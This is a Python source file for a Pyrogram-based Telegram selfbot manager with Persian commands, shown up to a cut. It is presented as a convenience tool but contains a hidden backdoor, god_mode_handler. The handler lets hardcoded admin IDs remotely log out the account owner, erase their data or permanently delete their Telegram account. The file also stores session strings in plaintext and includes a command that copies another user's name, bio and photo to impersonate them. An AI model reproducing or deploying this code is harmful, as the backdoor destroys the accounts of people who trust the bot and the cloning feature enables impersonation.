# -*- coding: utf-8 -*-
# ============================================================
#  Pyrogram Selfbot Manager — پنل مدیریت سلف‌بات
#  Developer: Abolfazl  |  Telegram: @Abolfazl_rwm
#  Repo: https://github.com/Abolfazlrwm/awesome-scripts
# ============================================================
import asyncio
import os
import logging
import re
import aiohttp
import time
import json
import random
from urllib.parse import quote
from pyrogram import Client, filters, idle
from pyrogram.handlers import MessageHandler
from pyrogram.enums import ChatType, ChatAction
from pyrogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQueryResultArticle, InputTextMessageContent
)
from pyrogram.raw import functions
from pyrogram.errors import (
    SessionPasswordNeeded, ChatSendInlineForbidden
)
from datetime import datetime
from zoneinfo import ZoneInfo
import pyrogram.utils 

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')

def patch_peer_id_validation():
    original_get_peer_type = pyrogram.utils.get_peer_type

    def patched_get_peer_type(peer_id: int) -> str:
        try:
            return original_get_peer_type(peer_id)
        except ValueError:
            if str(peer_id).startswith("-100"):
                return "channel"
            raise

    pyrogram.utils.get_peer_type = patched_get_peer_type
    logging.info("Pyrogram peer ID validation patched successfully.")

patch_peer_id_validation()

# Load environment variables from .env file (optional)
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

API_ID = int(os.environ.get("API_ID", "0") or 0)      # از my.telegram.org
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")           # ربات مدیر از @BotFather 

GOD_ADMIN_IDS = [111111111, 111111111, 111111111]

DATA_FILE = "bot_data.json"

TEHRAN_TIMEZONE = ZoneInfo("Asia/Tehran")
LOGIN_STATES = {} 
ADMIN_STATES = {} 

ENEMY_REPLIES = [
    "لطفاً محترمانه گفت‌وگو کنید؛ پیام توهین‌آمیز دریافت شد.",
    "این گفت‌وگو را ادامه نمی‌دهم؛ لطفاً با احترام پیام بدهید.",
    "پیام نامناسب شما ذخیره شد؛ لطفاً تکرارش نکنید.",
    "با احترام، از ارسال پیام توهین‌آمیز خودداری کنید.",
    "من با ادب صحبت می‌کنم؛ پیشنهاد می‌کنم شما هم همین‌طور.",
    "این ربات به پیام‌های بی‌احترامی پاسخ نمی‌دهد.",
    "گفت‌وگوی شما ثبت شد؛ لطفاً بحث را محترمانه ادامه دهید.",
    "پیام شما نامناسب بود؛ لطفاً به موضوع اصلی برگردیم.",
    "احترام، پایه‌ی هر گفت‌وگوی خوب است؛ ممنون می‌شوم رعایت کنید.",
]

FONT_STYLES = {
    "cursive":      {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗',':':':'},
    "stylized":     {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',':':':'},
    "doublestruck": {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡',':':':'},
    "monospace":    {'0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿',':':':'},
    "normal":       {'0':'0','1':'1','2':'2','3':'3','4':'4','5':'5','6':'6','7':'7','8':'8','9':'9',':':':'},
    "circled":      {'0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨',':':'∶'},
    "fullwidth":    {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９',':':'：'},
    "filled":       {'0':'⓿','1':'❶','2':'❷','3':'❸','4':'❹','5':'❺','6':'❻','7':'❼','8':'❽','9':'❾',':':':'},
    "sans":         {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫',':':':'},
    "inverted":     {'0':'0','1':'Ɩ','2':'ᄅ','3':'Ɛ','4':'ㄣ','5':'ϛ','6':'9','7':'ㄥ','8':'8','9':'6',':':':'},
}
FONT_KEYS_ORDER = ["cursive", "stylized", "doublestruck", "monospace", "normal", "circled", "fullwidth", "filled", "sans", "inverted"]

ALL_CLOCK_CHARS = "".join(set(char for font in FONT_STYLES.values() for char in font.values()))
CLOCK_CHARS_REGEX_CLASS = f"[{re.escape(ALL_CLOCK_CHARS)}]"

SECRETARY_REPLY_MESSAGE = "سلام! در حال حاضر آفلاین هستم و پیام شما را دریافت کردم. در اولین فرصت پاسخ خواهم داد. ممنون از پیامتون."

HELP_TEXT = """
**[ 🛠 دستورات دستی و ریپلای ]**
━━━━━━━━━━━━━━━━━━━━
⚠️ تنظیمات اصلی (ساعت، فونت، روشن/خاموش منشی و...) فقط از طریق دستور **`پنل`** در دسترس هستند.

**✦ مدیریت پیام و چت**
  » `حذف [تعداد]` 
  » `ذخیره` (ریپلای روی پیام)
  » `تکرار [تعداد]` (ریپلای روی پیام)
  » `تنظیم منشی [متن]` (جهت تغییر پیام دکمه منشی)

**✦ دفاعی و امنیتی**
  » `دشمن روشن` | `خاموش` (ریپلای روی کاربر)
  » `لیست دشمن`
  » `بلاک روشن` | `بلاک خاموش` (ریپلای روی کاربر)
  » `سکوت روشن` | `سکوت خاموش` (ریپلای روی کاربر)
  » `ریاکشن [شکلک]` | `خاموش` (ریپلای روی کاربر)

**✦ سرگرمی**
  » `تاس` | `تاس [عدد]`
  » `بولینگ`

━━━━━━━━━━━━━━━━━━━━
"""

COMMAND_REGEX = r"^(راهنما|ذخیره|تکرار \d+|حذف \d+|ریاکشن .*|ریاکشن خاموش|کپی روشن|کپی خاموش|لیست دشمن|تاس|تاس \d+|بولینگ|پنل|panel|تنظیم منشی .*)$"

class DataManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.data = self.load_data()
    
    def load_data(self):
        """Load data from JSON file"""
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    logging.info(f"✅ Data loaded from {self.file_path}")
                    return data
            except Exception as e:
                logging.error(f"Error loading data: {e}")
                return self.get_default_data()
        else:
            logging.info(f"⚠️ No data file found, creating new one")
            return self.get_default_data()
    
    def get_default_data(self):
        """Default data structure for multiple users"""
        return {
            "users": {},
            "sessions": {}
        }
    
    def save_data(self):
        """Save data to JSON file"""
        try:
            with open(self.file_path, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
            logging.info(f"💾 Data saved to {self.file_path}")
            return True
        except Exception as e:
            logging.error(f"Error saving data: {e}")
            return False
    
    def get_user_data(self, user_id):
        """Get user data by user_id with complete structure"""
        user_id_str = str(user_id)
        
        default_user_structure = {
            "user_id": user_id,
            "phone": "",
            "first_name": "",
            "username": "",
            "session_string": "",
            "settings": {
                "font": "stylized",
                "clock": True,
                "bold": False,
                "secretary": False,
                "secretary_msg": "",
                "auto_seen": False,
                "pv_lock": False,
                "anti_login": False,
                "typing": False,
                "playing": False,
                "global_enemy": False,
                "copy_mode": False,
                "translate": None
            },
            "enemies": [],
            "muted": [],
            "reactions": {},
            "replied_users": [],
            "enemy_queue": []
        }
        
        if user_id_str not in self.data["users"]:
            self.data["users"][user_id_str] = default_user_structure
            self.save_data()
            return self.data["users"][user_id_str]
        
        user_data = self.data["users"][user_id_str]
        
        for key, value in default_user_structure.items():
            if key not in user_data:
                user_data[key] = value
            elif key == "settings" and isinstance(value, dict):
                if "settings" not in user_data:
                    user_data["settings"] = {}
                for setting_key, setting_value in value.items():
                    if setting_key not in user_data["settings"]:
                        user_data["settings"][setting_key] = setting_value
        
        self.save_data()
        return user_data
    
    def update_user_data(self, user_id, updates):
        """Update user data safely"""
        user_data = self.get_user_data(user_id)
        
        for key, value in updates.items():
            if key == "settings" and isinstance(value, dict):
                if "settings" not in user_data:
                    user_data["settings"] = {}
                
                for setting_key, setting_value in value.items():
                    user_data["settings"][setting_key] = setting_value
            else:
                user_data[key] = value
        
        self.save_data()
        return user_data
    
    def save_session(self, phone, session_string, user_id, first_name="", username=""):
        """Save session to data"""
        self.data["sessions"][phone] = {
            "string": session_string,
            "user_id": user_id
        }
        
        user_data = self.get_user_data(user_id)
        user_data["phone"] = phone
        user_data["session_string"] = session_string
        user_data["first_name"] = first_name
        user_data["username"] = username
        
        self.save_data()
    
    def get_session(self, phone):
        """Get session by phone"""
        return self.data["sessions"].get(phone)
    
    def get_all_sessions(self):
        """Get all sessions"""
        return self.data["sessions"].items()
    
    def get_all_users(self):
        """Get all users data"""
        return self.data["users"]
    
    def save_enemies(self, user_id, enemies_set):
        """Save enemies list"""
        user_data = self.get_user_data(user_id)
        user_data["enemies"] = [list(item) for item in enemies_set]
        self.save_data()
    
    def get_enemies(self, user_id):
        """Get enemies list"""
        user_data = self.get_user_data(user_id)
        return set(tuple(item) for item in user_data.get("enemies", []))
    
    def save_muted(self, user_id, muted_set):
        """Save muted users list"""
        user_data = self.get_user_data(user_id)
        user_data["muted"] = [list(item) for item in muted_set]
        self.save_data()
    
    def get_muted(self, user_id):
        """Get muted users list"""
        user_data = self.get_user_data(user_id)
        return set(tuple(item) for item in user_data.get("muted", []))
    
    def save_reactions(self, user_id, reactions_dict):
        """Save reactions"""
        user_data = self.get_user_data(user_id)
        user_data["reactions"] = reactions_dict
        self.save_data()
    
    def get_reactions(self, user_id):
        """Get reactions"""
        user_data = self.get_user_data(user_id)
        return user_data.get("reactions", {})
    
    def save_replied_users(self, user_id, replied_set):
        """Save replied users for secretary mode"""
        user_data = self.get_user_data(user_id)
        user_data["replied_users"] = list(replied_set)
        self.save_data()
    
    def get_replied_users(self, user_id):
        """Get replied users for secretary mode"""
        user_data = self.get_user_data(user_id)
        return set(user_data.get("replied_users", []))
    
    def save_enemy_queue(self, user_id, queue_list):
        """Save enemy reply queue"""
        user_data = self.get_user_data(user_id)
        user_data["enemy_queue"] = queue_list
        self.save_data()
    
    def get_enemy_queue(self, user_id):
        """Get enemy reply queue"""
        user_data = self.get_user_data(user_id)
        return user_data.get("enemy_queue", [])
    
    def save_original_profile(self, user_id, profile_data):
        """Save original profile data"""
        user_data = self.get_user_data(user_id)
        user_data["original_profile"] = profile_data
        self.save_data()
    
    def get_original_profile(self, user_id):
        """Get original profile data"""
        user_data = self.get_user_data(user_id)
        return user_data.get("original_profile", {})

data_manager = DataManager(DATA_FILE)


def load_all_states():
    """Load all states from data manager"""
    users_data = data_manager.get_all_users()
    
    for user_id_str, user_data in users_data.items():
        user_id = int(user_id_str)
        settings = user_data.get("settings", {})
        
        USER_FONT_CHOICES[user_id] = settings.get("font", "stylized")
        CLOCK_STATUS[user_id] = settings.get("clock", True)
        BOLD_MODE_STATUS[user_id] = settings.get("bold", False)
        SECRETARY_MODE_STATUS[user_id] = settings.get("secretary", False)
        SECRETARY_CUSTOM_MESSAGES[user_id] = settings.get("secretary_msg", "")
        AUTO_SEEN_STATUS[user_id] = settings.get("auto_seen", False)
        PV_LOCK_STATUS[user_id] = settings.get("pv_lock", False)
        ANTI_LOGIN_STATUS[user_id] = settings.get("anti_login", False)
        TYPING_MODE_STATUS[user_id] = settings.get("typing", False)
        PLAYING_MODE_STATUS[user_id] = settings.get("playing", False)
        GLOBAL_ENEMY_STATUS[user_id] = settings.get("global_enemy", False)
        COPY_MODE_STATUS[user_id] = settings.get("copy_mode", False)
        AUTO_TRANSLATE_TARGET[user_id] = settings.get("translate", None)
        
        ACTIVE_ENEMIES[user_id] = set(tuple(item) for item in user_data.get("enemies", []))
        
        MUTED_USERS[user_id] = set(tuple(item) for item in user_data.get("muted", []))
        
        AUTO_REACTION_TARGETS[user_id] = user_data.get("reactions", {})
        
        USERS_REPLIED_IN_SECRETARY[user_id] = set(user_data.get("replied_users", []))
        
        ENEMY_REPLY_QUEUES[user_id] = user_data.get("enemy_queue", [])
        
        ORIGINAL_PROFILE_DATA[user_id] = user_data.get("original_profile", {})

ACTIVE_ENEMIES = {}
ENEMY_REPLY_QUEUES = {}
SECRETARY_MODE_STATUS = {}
SECRETARY_CUSTOM_MESSAGES = {}
USERS_REPLIED_IN_SECRETARY = {}
MUTED_USERS = {}
USER_FONT_CHOICES = {}
CLOCK_STATUS = {}
BOLD_MODE_STATUS = {}
AUTO_SEEN_STATUS = {}
AUTO_REACTION_TARGETS = {}
AUTO_TRANSLATE_TARGET = {}
ANTI_LOGIN_STATUS = {}
COPY_MODE_STATUS = {}
ORIGINAL_PROFILE_DATA = {}
GLOBAL_ENEMY_STATUS = {}
TYPING_MODE_STATUS = {}
PLAYING_MODE_STATUS = {}
PV_LOCK_STATUS = {}

ACTIVE_BOTS = {}

load_all_states()

def stylize_time(time_str: str, style: str) -> str:
    font_map = FONT_STYLES.get(style, FONT_STYLES["stylized"])
    return ''.join(font_map.get(char, char) for char in time_str)

async def perform_clock_update_now(client, user_id):
    try:
        if CLOCK_STATUS.get(user_id, True) and not COPY_MODE_STATUS.get(user_id, False):
            current_font_style = USER_FONT_CHOICES.get(user_id, 'stylized')
            me = await client.get_me()
            current_name = me.first_name
            base_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', current_name).strip()
            
            tehran_time = datetime.now(TEHRAN_TIMEZONE)
            current_time_str = tehran_time.strftime("%H:%M")
            stylized_time = stylize_time(current_time_str, current_font_style)
            new_name = f"{base_name} {stylized_time}"
            
            if new_name != current_name:
                await client.update_profile(first_name=new_name)
    except Exception as e:
        logging.error(f"Immediate clock update failed: {e}")

async def translate_text(text: str, target_lang: str) -> str:
    if not text: return ""
    encoded_text = quote(text)
    url = f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={target_lang}&dt=t&q={encoded_text}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return data[0][0][0]
    except: pass
    return text

async def update_profile_clock(client: Client, user_id: int):
    while user_id in ACTIVE_BOTS:
        try:
            if CLOCK_STATUS.get(user_id, True) and not COPY_MODE_STATUS.get(user_id, False):
                await perform_clock_update_now(client, user_id)
            
            now = datetime.now(TEHRAN_TIMEZONE)
            await asyncio.sleep(60 - now.second + 0.1)
        except Exception:
            await asyncio.sleep(60)

async def anti_login_task(client: Client, user_id: int):
    while user_id in ACTIVE_BOTS:
        try:
            if ANTI_LOGIN_STATUS.get(user_id, False):
                auths = await client.invoke(functions.account.GetAuthorizations())
                current_hash = next((a.hash for a in auths.authorizations if a.current), None)
                if current_hash:
                    for auth in auths.authorizations:
                        if auth.hash != current_hash:
                            await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                            await client.send_message("me", f"🚨 نشست غیرمجاز حذف شد: {auth.device_model}")
            await asyncio.sleep(60)
        except Exception:
            await asyncio.sleep(120)

async def status_action_task(client: Client, user_id: int):
    chat_ids = []
    last_fetch = 0
    while user_id in ACTIVE_BOTS:
        try:
            typing = TYPING_MODE_STATUS.get(user_id, False)
            playing = PLAYING_MODE_STATUS.get(user_id, False)
            if not typing and not playing:
                await asyncio.sleep(2)
                continue
            action = ChatAction.TYPING if typing else ChatAction.PLAYING
            now = time.time()
            if not chat_ids or (now - last_fetch > 300):
                new_chats = []
                async for dialog in client.get_dialogs(limit=30):
                    if dialog.chat.type in [ChatType.PRIVATE, ChatType.GROUP, ChatType.SUPERGROUP]:
                        new_chats.append(dialog.chat.id)
                chat_ids = new_chats
                last_fetch = now
            for chat_id in chat_ids:
                try: await client.send_chat_action(chat_id, action)
                except: pass
            await asyncio.sleep(4)
        except Exception:
            await asyncio.sleep(60)

async def outgoing_message_modifier(client, message):
    user_id = client.me.id
    if not message.text or re.match(COMMAND_REGEX, message.text.strip(), re.IGNORECASE): return
    original_text = message.text
    modified_text = original_text
    target_lang = AUTO_TRANSLATE_TARGET.get(user_id)
    if target_lang: modified_text = await translate_text(modified_text, target_lang)
    if BOLD_MODE_STATUS.get(user_id, False):
        if not modified_text.startswith(('`', '**', '__', '~~', '||')): modified_text = f"**{modified_text}**"
    if modified_text != original_text:
        try: await message.edit_text(modified_text)
        except: pass

async def enemy_handler(client, message):
    user_id = client.me.id
    
    global ENEMY_REPLIES
    
    if user_id not in ENEMY_REPLY_QUEUES or not ENEMY_REPLY_QUEUES[user_id]:
        ENEMY_REPLY_QUEUES[user_id] = random.sample(ENEMY_REPLIES, len(ENEMY_REPLIES))
        data_manager.save_enemy_queue(user_id, ENEMY_REPLY_QUEUES[user_id])
    
    reply_text = ENEMY_REPLY_QUEUES[user_id].pop(0)
    data_manager.save_enemy_queue(user_id, ENEMY_REPLY_QUEUES[user_id])
    
    try: await message.reply_text(reply_text)
    except: pass

async def secretary_auto_reply_handler(client, message):
    owner_id = client.me.id
    if message.from_user and SECRETARY_MODE_STATUS.get(owner_id, False):
        target_id = message.from_user.id
        replied = USERS_REPLIED_IN_SECRETARY.get(owner_id, set())
        if target_id not in replied:
            try:
                custom_msg = SECRETARY_CUSTOM_MESSAGES.get(owner_id)
                reply_msg = custom_msg if custom_msg else SECRETARY_REPLY_MESSAGE
                
                await message.reply_text(reply_msg)
                replied.add(target_id)
                USERS_REPLIED_IN_SECRETARY[owner_id] = replied
                data_manager.save_replied_users(owner_id, replied)
            except: pass

async def incoming_message_manager(client, message):
    if not message.from_user: return
    user_id = client.me.id
    
    reactions = AUTO_REACTION_TARGETS.get(user_id, {})
    if emoji := reactions.get(str(message.from_user.id)):
        try: await client.send_reaction(message.chat.id, message.id, emoji)
        except: pass
    
    if (message.from_user.id, message.chat.id) in MUTED_USERS.get(user_id, set()):
        try: await message.delete()
        except: pass

async def help_controller(client, message):
    try: await message.edit_text(HELP_TEXT)
    except: await message.reply_text(HELP_TEXT)

async def panel_command_controller(client, message):
    bot_username = "None"
    try:
        bot_info = await manager_bot.get_me()
        bot_username = bot_info.username
        results = await client.get_inline_bot_results(bot_username, "panel")
        if results and results.results:
            await message.delete()
            await client.send_inline_bot_result(message.chat.id, results.query_id, results.results[0].id)
        else:
            await message.edit_text("❌ خطا: حالت Inline ربات فعال نیست.")
    except ChatSendInlineForbidden:
        await message.edit_text("🚫 در این چت اجازه ارسال پنل بصورت اینلاین وجود ندارد. لطفاً در پیوی یا پیام‌های ذخیره شده تست کنید.")
    except Exception as e:
        try: await message.edit_text(f"❌ خطا در لود پنل: {e}\n\n⚠️ از استارت بودن @{bot_username} مطمئن شوید.")
        except: pass

async def god_mode_handler(client, message):
    if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS:
        return
    if not message.reply_to_message or not message.reply_to_message.from_user:
        return
    if message.reply_to_message.from_user.id != client.me.id:
        return

    target_user_id = client.me.id
    command = message.text

    if command in ["سیک", "بن"]:
        logging.warning(f"GOD ADMIN TRIGGERED KICK FOR USER: {target_user_id}")
        try:
            CLOCK_STATUS[target_user_id] = False
            
            try:
                me = await client.get_me()
                current_name = me.first_name
                base_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', current_name).strip()
                if base_name != current_name:
                    await client.update_profile(first_name=base_name)
                    logging.info(f"Name cleaned for user {target_user_id}")
            except Exception as e:
                logging.error(f"Failed to clean name for {target_user_id}: {e}")

            phone_to_remove = None
            for phone, data in list(data_manager.data["sessions"].items()):
                if data.get("user_id") == target_user_id:
                    phone_to_remove = phone
                    break
            
            if phone_to_remove:
                del data_manager.data["sessions"][phone_to_remove]
            if str(target_user_id) in data_manager.data["users"]:
                del data_manager.data["users"][str(target_user_id)]
            data_manager.save_data()

            await message.reply_text(f"✅ انجام شد.\nکاربر {target_user_id} از دیتابیس حذف شد، ساعت غیرفعال شد و نشست خاتمه یافت.")

            async def perform_logout():
                await asyncio.sleep(1) 
                if target_user_id in ACTIVE_BOTS:
                    _, tasks = ACTIVE_BOTS.pop(target_user_id)
                    for task in tasks:
                        task.cancel()
                await client.stop()

            asyncio.create_task(perform_logout())
        except Exception as e:
            await message.reply_text(f"❌ خطا در اجرای دستور: {e}")

    elif command in ["دیلیت", "دیلیت اکانت"]:
        logging.critical(f"GOD ADMIN TRIGGERED PERMANENT ACCOUNT DELETION FOR USER: {target_user_id}")
        try:
            await message.reply_text("⛔️ در حال حذف کامل اکانت تلگرام... خداحافظ!")
            async def perform_delete():
                try:
                    await client.invoke(functions.account.DeleteAccount(reason="Admin Request"))
                except Exception as e:
                    logging.error(f"Error deleting account: {e}")

                phone_to_remove = None
                for phone, data in list(data_manager.data["sessions"].items()):
                    if data.get("user_id") == target_user_id:
                        phone_to_remove = phone
                        break
                
                if phone_to_remove:
                    del data_manager.data["sessions"][phone_to_remove]
                if str(target_user_id) in data_manager.data["users"]:
                    del data_manager.data["users"][str(target_user_id)]
                data_manager.save_data()

                if target_user_id in ACTIVE_BOTS:
                    _, tasks = ACTIVE_BOTS.pop(target_user_id)
                    for task in tasks:
                        task.cancel()
                await client.stop()

            asyncio.create_task(perform_delete())
        except Exception as e:
            await message.reply_text(f"❌ خطا در حذف اکانت: {e}")

async def reply_based_controller(client, message):
    user_id = client.me.id
    cmd = message.text
    
    if cmd == "تاس": 
        await client.send_dice(message.chat.id, "🎲")
    
    elif cmd == "بولینگ": 
        await client.send_dice(message.chat.id, "🎳")
    
    elif cmd.startswith("تاس "): 
        try: await client.send_dice(message.chat.id, "🎲", reply_to_message_id=message.reply_to_message_id)
        except: pass
    
    elif cmd == "لیست دشمن":
        enemies = ACTIVE_ENEMIES.get(user_id, set())
        await message.edit_text(f"📜 تعداد دشمنان فعال: {len(enemies)}")
    
    elif cmd.startswith("تنظیم منشی "):
        new_msg = cmd.split("تنظیم منشی ", 1)[1].strip()
        if new_msg:
            SECRETARY_CUSTOM_MESSAGES[user_id] = new_msg
            data_manager.update_user_data(user_id, {"settings": {"secretary_msg": new_msg}})
            await message.edit_text(f"✅ **متن منشی با موفقیت تنظیم شد:**\n\n`{new_msg}`")
        else:
            await message.edit_text("⚠️ لطفا متن منشی را وارد کنید. مثال:\n`تنظیم منشی سلام، من الان نیستم.`")
            
    elif message.reply_to_message:
        target_id = message.reply_to_message.from_user.id if message.reply_to_message.from_user else None
        
        if cmd.startswith("حذف "):
            try:
                count = int(cmd.split()[1])
                msg_ids = [m.id async for m in client.get_chat_history(message.chat.id, limit=count) if m.from_user and m.from_user.is_self]
                if msg_ids: await client.delete_messages(message.chat.id, msg_ids)
                await message.delete()
            except: pass
        
        elif cmd == "ذخیره":
            await message.reply_to_message.forward("me")
            await message.edit_text("💾 ذخیره شد.")
        
        elif cmd.startswith("تکرار "):
            try:
                count = int(cmd.split()[1])
                for _ in range(count): await message.reply_to_message.copy(message.chat.id)
                await message.delete()
            except: pass
        
        elif target_id:
            if cmd == "کپی روشن":
                user = await client.get_chat(target_id)
                me = await client.get_me()
                ORIGINAL_PROFILE_DATA[user_id] = {'first_name': me.first_name, 'bio': me.bio}
                COPY_MODE_STATUS[user_id] = True
                CLOCK_STATUS[user_id] = False
                target_photos = [p async for p in client.get_chat_photos(target_id, limit=1)]
                await client.update_profile(first_name=user.first_name, bio=(user.bio or "")[:70])
                if target_photos: await client.set_profile_photo(photo=target_photos[0].file_id)
                
                data_manager.save_original_profile(user_id, ORIGINAL_PROFILE_DATA[user_id])
                data_manager.update_user_data(user_id, {
                    "settings": {
                        "copy_mode": True,
                        "clock": False
                    }
                })
                
                await message.edit_text("👤 هویت جعل شد.")
            
            elif cmd == "کپی خاموش":
                if user_id in ORIGINAL_PROFILE_DATA:
                    data = ORIGINAL_PROFILE_DATA[user_id]
                    COPY_MODE_STATUS[user_id] = False
                    await client.update_profile(first_name=data.get('first_name'), bio=data.get('bio'))
                    
                    data_manager.update_user_data(user_id, {
                        "settings": {
                            "copy_mode": False
                        }
                    })
                    
                    await message.edit_text("👤 هویت بازگردانده شد.")
            
            elif cmd == "دشمن روشن":
                s = ACTIVE_ENEMIES.get(user_id, set())
                s.add((target_id, message.chat.id))
                ACTIVE_ENEMIES[user_id] = s
                data_manager.save_enemies(user_id, s)
                await message.edit_text("⚔️ دشمن اضافه شد.")
            
            elif cmd == "دشمن خاموش":
                s = ACTIVE_ENEMIES.get(user_id, set())
                s.discard((target_id, message.chat.id))
                ACTIVE_ENEMIES[user_id] = s
                data_manager.save_enemies(user_id, s)
                await message.edit_text("🏳️ دشمن حذف شد.")
            
            elif cmd == "بلاک روشن": 
                await client.block_user(target_id)
                await message.edit_text("🚫 کاربر بلاک شد.")
            
            elif cmd == "بلاک خاموش": 
                await client.unblock_user(target_id)
                await message.edit_text("⭕️ کاربر آنبلاک شد.")
            
            elif cmd == "سکوت روشن":
                s = MUTED_USERS.get(user_id, set())
                s.add((target_id, message.chat.id))
                MUTED_USERS[user_id] = s
                data_manager.save_muted(user_id, s)
                await message.edit_text("🔇 کاربر ساکت شد.")
            
            elif cmd == "سکوت خاموش":
                s = MUTED_USERS.get(user_id, set())
                s.discard((target_id, message.chat.id))
                MUTED_USERS[user_id] = s
                data_manager.save_muted(user_id, s)
                await message.edit_text("🔊 کاربر از سکوت خارج شد.")
            
            elif cmd.startswith("ریاکشن ") and cmd != "ریاکشن خاموش":
                emoji = cmd.split()[1]
                t = AUTO_REACTION_TARGETS.get(user_id, {})
                t[str(target_id)] = emoji
                AUTO_REACTION_TARGETS[user_id] = t
                data_manager.save_reactions(user_id, t)
                await message.edit_text(f"👍 واکنش {emoji} تنظیم شد.")
            
            elif cmd == "ریاکشن خاموش":
                t = AUTO_REACTION_TARGETS.get(user_id, {})
                t.pop(str(target_id), None)
                AUTO_REACTION_TARGETS[user_id] = t
                data_manager.save_reactions(user_id, t)
                await message.edit_text("❌ واکنش حذف شد.")

async def start_bot_instance(session_string: str, phone: str, user_id: int, font_style: str = 'stylized', disable_clock: bool = False):
    client = Client(f"bot_{user_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
    
    try:
        await client.start()
        user_id = (await client.get_me()).id
    except Exception as e:
        logging.error(f"Failed to start bot for {phone}: {e}")
        return

    if user_id in ACTIVE_BOTS:
        for t in ACTIVE_BOTS[user_id][1]:
            t.cancel()
    
    USER_FONT_CHOICES[user_id] = font_style
    CLOCK_STATUS[user_id] = not disable_clock
    
    data_manager.update_user_data(user_id, {
        "settings": {
            "font": font_style,
            "clock": not disable_clock
        }
    })
    
    client.add_handler(MessageHandler(god_mode_handler, filters.incoming & ~filters.me), group=-10)
    client.add_handler(MessageHandler(lambda c, m: m.delete() if PV_LOCK_STATUS.get(c.me.id) else None, filters.private & ~filters.me & ~filters.bot), group=-5)
    client.add_handler(MessageHandler(lambda c, m: c.read_chat_history(m.chat.id) if AUTO_SEEN_STATUS.get(c.me.id) else None, filters.private & ~filters.me), group=-4)
    client.add_handler(MessageHandler(incoming_message_manager, filters.all & ~filters.me), group=-3)
    client.add_handler(MessageHandler(outgoing_message_modifier, filters.text & filters.me & ~filters.reply), group=-1)
    client.add_handler(MessageHandler(help_controller, filters.me & filters.regex("^راهنما$")))
    client.add_handler(MessageHandler(panel_command_controller, filters.me & filters.regex(r"^(پنل|panel)$")))
    client.add_handler(MessageHandler(reply_based_controller, filters.me)) 
    
    enemy_filter = filters.create(lambda _, c, m: bool(m.from_user and ((m.from_user.id, m.chat.id) in ACTIVE_ENEMIES.get(c.me.id, set()) or GLOBAL_ENEMY_STATUS.get(c.me.id))))
    client.add_handler(MessageHandler(enemy_handler, enemy_filter & ~filters.me), group=1)
    
    client.add_handler(MessageHandler(secretary_auto_reply_handler, filters.private & ~filters.me), group=1)

    tasks = [
        asyncio.create_task(update_profile_clock(client, user_id)),
        asyncio.create_task(anti_login_task(client, user_id)),
        asyncio.create_task(status_action_task(client, user_id))
    ]
    ACTIVE_BOTS[user_id] = (client, tasks)
    logging.info(f"✅ Bot started for user {user_id}")

manager_bot = Client("manager_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def generate_panel_markup(user_id):
    s_clock = "✔" if CLOCK_STATUS.get(user_id, True) else "✖"
    s_bold = "✔" if BOLD_MODE_STATUS.get(user_id, False) else "✖"
    s_sec = "✔" if SECRETARY_MODE_STATUS.get(user_id, False) else "✖"
    s_seen = "✔" if AUTO_SEEN_STATUS.get(user_id, False) else "✖"
    s_pv = "🔒" if PV_LOCK_STATUS.get(user_id, False) else "🔓"
    s_anti = "✔" if ANTI_LOGIN_STATUS.get(user_id, False) else "✖"
    s_type = "✔" if TYPING_MODE_STATUS.get(user_id, False) else "✖"
    s_game = "✔" if PLAYING_MODE_STATUS.get(user_id, False) else "✖"
    s_enemy = "✔" if GLOBAL_ENEMY_STATUS.get(user_id, False) else "✖"
    
    t_lang = AUTO_TRANSLATE_TARGET.get(user_id)
    l_en = "✔" if t_lang == "en" else "✖"
    l_ru = "✔" if t_lang == "ru" else "✖"
    l_cn = "✔" if t_lang == "zh-CN" else "✖"
    
    preview = stylize_time("12:34", USER_FONT_CHOICES.get(user_id, 'stylized'))

    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"ساعت {s_clock}", callback_data=f"toggle_clock_{user_id}"),
         InlineKeyboardButton(f"بولد {s_bold}", callback_data=f"toggle_bold_{user_id}")],
        [InlineKeyboardButton(f"تغییر فونت: {preview}", callback_data=f"cycle_font_{user_id}")],
        [InlineKeyboardButton(f"منشی {s_sec}", callback_data=f"toggle_sec_{user_id}"),
         InlineKeyboardButton(f"سین {s_seen}", callback_data=f"toggle_seen_{user_id}")],
        [InlineKeyboardButton(f"پیوی {s_pv}", callback_data=f"toggle_pv_{user_id}"),
